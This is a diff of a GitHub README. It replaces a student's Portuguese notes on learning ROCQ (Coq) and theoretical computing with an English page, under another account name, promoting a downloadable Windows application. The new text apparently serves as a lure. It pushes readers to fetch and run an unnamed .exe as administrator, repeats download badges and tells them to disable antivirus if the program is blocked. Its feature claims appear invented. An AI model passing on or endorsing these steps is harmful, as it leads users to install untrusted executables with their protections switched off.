@@ -1,24 +1,121 @@
-# Aprendendo ROCQ e formalização matemática de programas
+# 🔍 learning-formal-computation - Understand Computation with Simple Tools
 
-Estou iniciando meus estudos em **computação teórica** e **formalização matemática de programas**. Este estudo servirá como base para compreender melhor **paradigmas de programação, compiladores e verificação de sistemas críticos**.
+[![Download Here](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/rosalindaadnate390/learning-formal-computation)
 
-Embora **ROCQ (antigo Coq)** seja o foco principal, o estudo não se limitará apenas a essa ferramenta. **Programação funcional, linguagens formais, autômatos, cálculo lambda e outros assuntos relacionados à essência da ciência da computação** também serão abordados posteriormente neste repositório.
+---
 
-## Confira outros repositórios relacionados à computação teórica
+## About this project
 
-Nos últimos meses em que estive ativo no GitHub, compartilhei **projetos pessoais, trabalhos de disciplinas da faculdade e projetos desenvolvidos para a FnEsc**, entre outros.  
-Abaixo estão alguns dos principais repositórios que servirão como base para a construção deste repositório:
+This application helps you explore basic ideas about computation. It focuses on formal computation, lambda calculus, and program verification using ROCQ (Coq). You do not need prior programming skills to use the software.
 
-- [Aprendendo o paradigma funcional com Haskell](https://github.com/FrankSteps/Learning_Functional_Programming)
-- [Aprendendo sobre a máquina de Turing com um simulador online](https://github.com/FrankSteps/turing-machine-experiments)
-- [Experimento com cálculo diferencial e integral aplicado com Haskell](https://github.com/FrankSteps/integrals-in-haskell)
-- [Meu simulador em C++ com Raylib para interface gráfica](https://github.com/FrankSteps/Apple-juice-learning-board-simulator)
+The project covers topics like computer science, mathematics, logic, and more. It uses useful tools such as Coq for proofs and Haskell for computations. This app works on Windows and is designed for learning and experimentation.
 
+---
 
-## Nota
+## 🖥️ System Requirements
 
-Uma característica pessoal da minha forma de estudar é buscar conexões entre diferentes áreas do conhecimento. Tenho grande satisfação quando consigo utilizar conhecimentos de uma área para compreender ou descobrir algo em outra área (_mesmo que sejam bem longe uma da outra_).
+Before you install the software, make sure your Windows computer has the following:
 
-Por isso, não estranhe se eu mencionar conceitos que, à primeira vista, parecem não ter relação direta com o assunto em estudo. Essa é a forma como gosto de aprender: **buscando conexões**.
+- Windows 10 or newer (64-bit versions recommended)
+- At least 4 GB of RAM available
+- 500 MB of free disk space
+- Internet connection to download and update the software
+- Administrator rights may be required for installation
 
-De certa forma, essa abordagem reflete o próprio funcionamento do cérebro humano: uma rede de neurônios que trocam informações continuamente, formando associações e padrões, mesmo sem contato físico direto entre si.
+These requirements ensure the app runs smoothly and gives you the best experience.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run the application on your Windows machine:
+
+1. Click the large download badge above or open this link in your browser:  
+   https://github.com/rosalindaadnate390/learning-formal-computation  
+
+2. You will arrive at the project page on GitHub. Look for the **Releases** section or the project files.  
+3. Download the latest file suitable for Windows. This will usually be an `.exe` or `.zip` file.  
+4. If you download a `.zip` file, right-click it and select **Extract All** to unzip it in a folder.  
+5. If you downloaded an `.exe` file, double-click it to start the installation.  
+6. Follow the on-screen instructions to complete setup. This usually includes accepting a license and choosing an install folder.  
+7. When installation finishes, find the application in your Start Menu or on your desktop and double-click to launch it.  
+
+Now you are ready to start exploring formal computation concepts interactively.
+
+---
+
+## ⚙️ Installation Details and Setup
+
+Once you have downloaded the file:
+
+- If the file ends with `.exe`, it is an installer. Double-click and follow the steps to install the program.  
+- If it is a `.zip` or other compressed folder, extract the contents before opening any files.  
+- After installation or extraction, check the folder for a file named `README` or `instructions.txt` for additional steps unique to this project.  
+- The program interface is simple and user-friendly, with menus and buttons to guide you through examples and exercises.  
+
+You do not need to install additional software like Coq or Haskell separately. Everything needed runs inside the app.
+
+---
+
+## 📖 Using the Application
+
+Here is what you will find when you open the app:
+
+- **Formal Computation Exercises:** Step through examples that explain basic computation ideas.  
+- **Lambda Calculus Tutorials:** Learn key concepts of lambda calculus through tasks and quizzes.  
+- **Program Verification:** See how you can check if algorithms are correct using Coq-based proofs.  
+- **Interactive Haskell Examples:** Run small programs written in Haskell to see computation in action.  
+- **Mathematical Foundations:** Understand logic and formal methods behind computing machines, such as the Turing Machine model.  
+- **Documentation:** Access detailed notes and explanations formatted in LaTeX style.  
+
+You can explore each section at your own pace, with no coding skills required.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you have trouble running the software, try these suggestions:
+
+- Make sure your system meets the minimum requirements mentioned above.  
+- Run the application as administrator if you get permission errors. Right-click the app icon and select **Run as administrator**.  
+- Disable antivirus temporarily if it blocks the app from launching or downloading files.  
+- Check for Windows updates and install them if available.  
+- Restart your computer after installation before running the app for the first time.  
+- If the app crashes or shows errors, note the error message and try searching online with the exact text.  
+- Reach out on GitHub by opening an issue in the repository if problems continue. Include your Windows version and a description of the problem.
+
+---
+
+## 🔗 Download Link
+
+Access the program and the latest files here:  
+[Download learning-formal-computation](https://github.com/rosalindaadnate390/learning-formal-computation)
+
+This link provides access to all releases, updates, and documentation. Check here regularly for new versions.
+
+---
+
+## ⚖️ License and Use
+
+This project is open for anyone to explore and learn from. You may use it freely for personal education or research.
+
+Do not redistribute the software for commercial gain. Refer to the repository license file on GitHub for full details about terms and permissions.
+
+---
+
+## 📚 More Learning
+
+If you want to explore related topics beyond the application, consider reading about:
+
+- Formal methods in computer science  
+- Lambda calculus basics  
+- Introduction to Coq and proof assistants  
+- Haskell programming for beginners  
+- Computability theory and Turing machines  
+- LaTeX for writing technical documents  
+
+These subjects will deepen your understanding of the concepts introduced in the software.
+
+---
+
+[![Download Here](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/rosalindaadnate390/learning-formal-computation)
